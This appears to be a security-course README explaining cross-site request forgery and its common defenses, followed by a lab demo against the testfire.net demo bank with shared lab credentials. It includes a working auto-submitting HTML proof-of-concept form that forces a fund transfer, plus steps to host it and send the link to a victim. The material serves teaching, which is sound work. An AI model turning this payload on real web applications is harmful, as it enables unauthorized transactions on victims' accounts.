 
[![made-with-html](https://img.shields.io/badge/Made%20with-HTML-1f425f.svg)](https://www.python.org/)


<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="114" height="20" role="img" aria-label="Instructor: Dr.404"><title>Instructor: Dr.404</title><linearGradient id="s" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="r"><rect width="114" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#r)"><rect width="65" height="20" fill="#555"/><rect x="65" width="49" height="20" fill="#4c1"/><rect width="114" height="20" fill="url(#s)"/></g><g fill="#fff" text-anchor="middle" font-family="Verdana,Geneva,DejaVu Sans,sans-serif" text-rendering="geometricPrecision" font-size="110"><text aria-hidden="true" x="335" y="150" fill="#010101" fill-opacity=".3" transform="scale(.1)" textLength="550">Instructor</text><text x="335" y="140" transform="scale(.1)" fill="#fff" textLength="550">Instructor</text><text aria-hidden="true" x="885" y="150" fill="#010101" fill-opacity=".3" transform="scale(.1)" textLength="390">Dr.404</text><text x="885" y="140" transform="scale(.1)" fill="#fff" textLength="390">Dr.404</text></g></svg>




 # Cross-Site Request Forgery (CSRF)

 - an attack that forces an end user `to execute unwanted actions` on a web application in which theyâ€™re `currently authenticated`. 

 - With a little help of `social engineering` (such as sending a link via email or chat), 

 - If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like `transferring funds`, c`hanging their password`, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

 [Reference-OWASP](https://owasp.org/www-community/attacks/csrf)

![CSRF](../photo/csrf.png)



# Common defenses against CSRF 

[Reference_portswigger.net](https://portswigger.net/web-security/csrf)

 The most common defenses are as follows:

- CSRF tokens - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. This makes it very difficult for an attacker to construct a valid request on behalf of the victim.

    
- Referer-based validation - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. This is generally less effective than CSRF token validation.

![CSRF](../photo/anti_csrf.png)


# Lab Demo

## Lab Websit

`http://testfire.net/login.jsp`

## Lab Credentials

```
username = jsmith   
password = demo1234

```

## Example CSRF POC Form

```html
<h1>CSRF</h1>
<form id="form1" action="http://testfire.net/bank/doTransfer" method="POST">
    <input name="fromAccount" value="800002" />
    <input name="toAccount" value="4539082039396288" />
    <input name="transferAmount" value="3333" />
</form>
<script type="text/javascript">
document.getElementById('form1').submit();
</script>

```

## Labs Steps

1. Construct `CSRF Form` manaully or using burp suite  `engagement tools (csrf PoC`.

2. Run web server and send the link to victim

3. Exploit